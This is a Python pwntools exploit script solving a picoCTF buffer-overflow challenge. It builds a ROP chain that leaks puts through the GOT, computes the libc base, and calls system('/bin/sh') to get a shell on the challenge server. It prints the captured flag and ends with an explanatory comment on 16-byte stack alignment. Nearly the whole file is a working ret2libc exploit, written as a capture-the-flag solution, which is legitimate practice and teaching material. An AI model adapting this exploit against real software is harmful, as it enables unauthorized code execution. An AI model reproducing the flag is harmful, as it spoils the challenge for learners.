from pwn import *
from Crypto.Util.number import bytes_to_long
import struct

def main():
    LOCAL = False
    libc = ELF('./libc.so.6')
    if LOCAL == True:
        p = process('./vuln')
        elf = p.elf
    else:
        p = remote('mercury.picoctf.net', 49464)
        elf = ELF('./vuln')


    # General idea is leak an address for a function
    # Use address to calculate the base of libc
    # From this base, find where system is
    # Create a remote shell using the system call
    # Chain should look like:


    # Step 1: Getting the location of the printf pointer and going back to main
    # pop rdi; ret
    # Address of puts@got
    # Address of puts@plt
    # Address of main

    stack_size = b'A' * 128
    rbp = b'B' * 8
    pop_rdi = p64(0x0000000000400913) 
    puts_got = p64(elf.got["puts"]) 
    puts_plt = p64(elf.plt["puts"])
    main_ret = p64(0x00000000004006d8)
    chain1 = pop_rdi + puts_got + puts_plt + main_ret
    payload1 = stack_size + rbp + chain1

    l = p.recvuntil(b'\n')
    print(l)
#    gdb.attach(p, gdbscript='''
#        b *0x0000000000400913
#    ''')
    l = p.sendline(payload1)
    l = p.recvline()
    print("line is: ", l)
    l = p.recvline().strip()
    print("Received line: ", l.hex(), l)
    l = l[::-1]
    puts_addr = bytes_to_long(l)
    print("line is: ", l.hex(), puts_addr)


    # Second payload:
    # Calculating the offsets
    # The general idea is that we get the address for puts 
    # Now, we can calculate the offset from the base and find system
    # Payload should be stack + pop_rdi, binsh, system
    # The ret gadget is important to maintain a 16-byte stack alignment. If the stack is not aligned, calling the function can seg fault. The alignment is used for floating point operations 
    libc.address = puts_addr - libc.symbols['puts']
    system = p64(libc.symbols['system'])
    bin_sh = p64(libc.search(b'/bin/sh').__next__())
    print("Binsh location: ", bin_sh)
    ret = p64(0x000000000040052e)
    chain2 = ret + pop_rdi + bin_sh + system
    payload2 = stack_size + rbp + chain2
    p.sendline(payload2)
    p.interactive()
    # Flag: picoCTF{1_<3_sm4sh_st4cking_37b2dd6c2acb572a}

if __name__ == '__main__':
    main()

'''
More on the alignment issue:
    The 16-byte stack alignment requirement in x86-64 architecture is not specifically related to the size of the floating-point values that are being operated on. While single-precision and double-precision floating-point values are 4 bytes and 8 bytes in size, respectively, the requirement for 16-byte stack alignment is more related to how the processor operates on the data.

The 16-byte stack alignment requirement is specified by the System V AMD64 ABI, which is the calling convention used in x86-64 architecture. This calling convention specifies that the stack pointer %rsp must always be aligned to a multiple of 16 bytes before a function call, to ensure that SSE instructions that operate on floating-point values are executed correctly.

SSE instructions operate on 128-bit XMM registers, which are 16 bytes in size. These instructions require that the data they operate on is aligned to a 16-byte boundary in memory. If the data is not properly aligned, SSE instructions can result in segmentation faults or other unexpected behavior.

In order to ensure that the SSE instructions operate correctly, the stack must be aligned to a multiple of 16 bytes before a function call. This is typically achieved by adding padding to the stack to ensure that the stack pointer %rsp is properly aligned.

While the 16-byte stack alignment requirement is more related to SSE instructions than to the size of floating-point values, it is worth noting that double-precision floating-point values are themselves 8 bytes in size, which means that two double-precision values can be stored in a 16-byte XMM register.
'''
